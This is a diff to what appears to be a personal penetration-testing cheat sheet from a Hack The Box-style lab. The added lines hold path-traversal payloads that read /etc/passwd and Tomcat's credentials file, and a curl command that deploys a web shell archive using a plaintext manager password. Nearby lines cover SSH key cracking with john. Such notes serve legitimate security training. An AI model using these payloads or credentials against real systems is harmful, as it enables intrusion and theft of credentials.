@@ -12,15 +12,31 @@ cewl -w output.txt http://10.10.10.191
 
 ## Zone Transfer
 
+## LFI WEBB
+
+```
+http://megahosting.htb/news.php?file=../../../../etc/passwd
+```
+
+```
+php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml
+```
+
 ## Java Files
 
 USE
 
 jd-gui APP
 
+## Using Curl to upload a file
+
+```
+curl -T shell.war -u 'tomcat':'$3cureP4s5w0rd123!' 'http://tabby.htb:8080/manager/text/deploy?path=/myapp'
+```
+
 ## SSH key crack
 
-## john to ssh
+## ssh to john
 
 ```
 /usr/share/john/ssh2john.py id_rsa2 > hash.txt
